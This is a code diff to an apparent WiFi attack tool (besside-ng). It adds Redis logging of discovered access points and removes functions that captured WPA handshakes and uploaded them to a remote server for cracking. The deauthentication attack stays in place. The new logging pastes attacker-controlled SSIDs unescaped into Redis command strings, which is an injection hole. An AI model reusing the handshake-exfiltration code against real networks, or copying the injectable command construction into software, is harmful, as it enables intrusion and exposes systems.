@@ -51,6 +51,7 @@
 #include <errno.h>
 #include <netdb.h>
 #include <unistd.h>
+#include <hiredis.h>
 
 #ifdef HAVE_PCRE
 #include <pcre.h>
@@ -243,6 +244,9 @@ struct state {
 	int		s_wpafd;
 	int		s_wepfd;
 } _state;
+
+redisContext *redis_context;
+
 
 static void attack_continue(struct network *n);
 static void attack(struct network *n);
@@ -638,6 +642,12 @@ static inline void print_hex(void *p, int len)
 static void network_print(struct network *n)
 {
 	const char *crypto = "dunno";
+    char *bssid_key;
+    char *redis_cmd;
+    char *format;
+    int len;
+    redisReply *reply;
+    // TODo: skip broadcast and skip rouge aps
 
 	switch (n->n_crypto) {
 	case CRYPTO_NONE:
@@ -653,9 +663,20 @@ static void network_print(struct network *n)
 		break;
 
 	case CRYPTO_WPA_MGT:
-		crypto = "WPA-SECURE";
+		crypto = "WPA2";
 		break;
 	}
+    len = snprintf(NULL, 0, "access_point_%s", mac2str(n->n_bssid));
+    bssid_key = malloc(len + 1);
+    sprintf(bssid_key, "access_point_%s", mac2str(n->n_bssid));
+
+    format = "HMSET %s ssid '%s' crypto %s bssid %s channel %d";
+    len = snprintf(NULL, 0, format, bssid_key, n->n_ssid, crypto, mac2str(n->n_bssid), n->n_chan);
+    redis_cmd = (char *)malloc(len + 1);
+    sprintf(redis_cmd, format, bssid_key, n->n_ssid, crypto, mac2str(n->n_bssid), n->n_chan);
+    reply = redisCommand(redis_context, redis_cmd);
+    /*printf("%s", redis_cmd);
+    printf("SET: %s\n", reply->str);*/
 
 	time_printf(V_VERBOSE,
 		    "Found AP %s [%s] chan %d crypto %s dbm %d\n",
@@ -706,7 +727,7 @@ static void wifi_send(void *p, int len)
 
 	rc = wi_write(_state.s_wi, p, len, &tx);
 	if (rc == -1)
-		err(1, "wi_wirte()");
+		err(1, "wi_write()");
 }
 
 static void deauth_send(struct network *n, unsigned char *mac)
@@ -802,178 +823,6 @@ static void packet_write_pcap(int fd, struct packet *p)
 	write_pcap(fd, p->p_data, p->p_len);
 }
 
-static void wpa_upload(void)
-{
-	struct sockaddr_in s_in;
-	int s;
-	char buf[4096];
-	char boundary[128];
-	char h1[1024];
-	char form[1024];
-	struct stat stat;
-	off_t off;
-	int tot;
-	int ok = 0;
-
-	memset(&s_in, 0, sizeof(s_in));
-
-	s_in.sin_family = PF_INET;
-	s_in.sin_port   = htons(80);
-
-	if (inet_aton(_conf.cf_wpa_server, &s_in.sin_addr) == 0) {
-		struct hostent *he;
-
-		he = gethostbyname(_conf.cf_wpa_server);
-		if (!he)
-			goto __no_resolve;
-
-		if (!he->h_addr_list[0]) {
-__no_resolve:
-			time_printf(V_NORMAL, "Can't resolve %s\n",
-				    _conf.cf_wpa_server);
-			return;
-		}
-
-		memcpy(&s_in.sin_addr, he->h_addr_list[0], 4);
-	}
-
-	if ((s = socket(s_in.sin_family, SOCK_STREAM, 0)) == -1)
-		err(1, "socket()");
-
-	if (connect(s, (struct sockaddr*) &s_in, sizeof(s_in)) == -1) {
-		time_printf(V_NORMAL, "Can't connect to %s\n",
-			    _conf.cf_wpa_server);
-
-		close(s);
-		return;
-	}
-
-	if (fstat(_state.s_wpafd, &stat) == -1)
-		err(1, "fstat()");
-
-	snprintf(boundary, sizeof(boundary),
-		 "37872861916401860062104501923");
-
-	snprintf(h1, sizeof(h1),
-		 "--%s\r\n"
-		 "Content-Disposition: form-data;"
-			 " name=\"file\";"
-			 " filename=\"wpa.cap\"\r\n"
-		 "Content-Type: application/octet-stream\r\n\r\n", boundary);
-
-	snprintf(form, sizeof(form),
-		 "\r\n"
-		 "--%s\r\n"
-		 "Content-Disposition: form-data;"
-		 " name=\"fs\"\r\n\r\n"
-		 "Upload"
-		 "\r\n"
-		 "%s--\r\n", boundary, boundary);
-
-	tot = stat.st_size;
-
-	snprintf(buf, sizeof(buf),
-		"POST /index.php HTTP/1.0\r\n"
-		"Host: %s\r\n"
-		"User-Agent: besside-ng\r\n"
-		"Content-Type: multipart/form-data; boundary=%s\r\n"
-		"Content-Length: %d\r\n\r\n",
-		_conf.cf_wpa_server,
-		boundary,
-		(int) (strlen(h1) + strlen(form) + tot));
-
-	if (write(s, buf, strlen(buf)) != (int) strlen(buf))
-		goto __fail;
-
-	if (write(s, h1, strlen(h1)) != (int) strlen(h1))
-		goto __fail;
-
-	if ((off = lseek(_state.s_wpafd, 0, SEEK_CUR)) == (off_t) -1)
-		err(1, "lseek()");
-
-	if (lseek(_state.s_wpafd, 0, SEEK_SET) == (off_t) -1)
-		err(1, "lseek()");
-
-	while (tot) {
-		int l = tot;
-
-		if (l > (int) sizeof(buf))
-			l = sizeof(buf);
-
-		if (read(_state.s_wpafd, buf, l) != l)
-			err(1, "read()");
-
-		if (write(s, buf, l) != l)
-			goto __fail;
-
-		tot -= l;
-	}
-
-	if (write(s, form, strlen(form)) != (int) strlen(form))
-		goto __fail;
-
-	if (lseek(_state.s_wpafd, off, SEEK_SET) == (off_t) -1)
-		err(1, "lseek()");
-
-	while ((tot = read(s, buf, sizeof(buf) - 1)) > 0) {
-		char *p;
-
-		buf[tot] = 0;
-
-		p = strstr(buf, "\r\n\r\n");
-		if (!p)
-			goto __fail;
-
-		p += 4;
-
-		if (atoi(p) == 2)
-			ok = 1;
-		else
-			goto __fail;
-	}
-
-	if (!ok)
-		goto __fail;
-
-	close(s);
-
-	time_printf(V_NORMAL, "Uploaded WPA handshake to %s\n",
-		    _conf.cf_wpa_server);
-
-	return;
-__fail:
-	close(s);
-	time_printf(V_NORMAL, "WPA handshake upload failed\n");
-}
-
-static void wpa_crack(struct network *n)
-{
-	int i;
-
-	packet_write_pcap(_state.s_wpafd, &n->n_beacon);
-
-	for (i = 0; i < 4; i++) {
-		struct packet *p = &n->n_client_handshake->c_handshake[i];
-
-		if (p->p_len)
-			packet_write_pcap(_state.s_wpafd, p);
-	}
-
-	fsync(_state.s_wpafd);
-
-	if (_conf.cf_wpa_server)
-		wpa_upload();
-	else {
-		time_printf(V_NORMAL, "Run aircrack on %s for WPA key\n",
-			    _conf.cf_wpa);
-	}
-
-	/* that was fast cracking! */
-	n->n_astate = ASTATE_DONE;
-
-	attack_continue(n);
-}
-
 static void attack_wpa(struct network *n)
 {
 	switch (n->n_astate) {
@@ -982,10 +831,6 @@ static void attack_wpa(struct network *n)
 		/* fallthrough */
 	case ASTATE_DEAUTH:
 		deauth(n);
-		break;
-
-	case ASTATE_WPA_CRACK:
-		wpa_crack(n);
 		break;
 	}
 }
@@ -2541,7 +2386,7 @@ static struct network *network_update(struct ieee80211_frame* wh)
 	return n;
 }
 
-static void wifi_read(void)
+static void wifi_read()
 {
 	struct state *s = &_state;
 	unsigned char buf[2048];
@@ -2940,6 +2785,11 @@ static void pwn(void)
 	struct timeval tv;
 	fd_set fds;
 	int wifd, max, rc;
+    const char *hostname = "127.0.0.1";
+    int port = 6379;
+    struct timeval timeout = { 1, 500000 };
+
+    redis_context = redisConnectWithTimeout(hostname, port, timeout);
 
 	if (!(s->s_wi = wi_open(_conf.cf_ifname)))
 		err(1, "wi_open()");
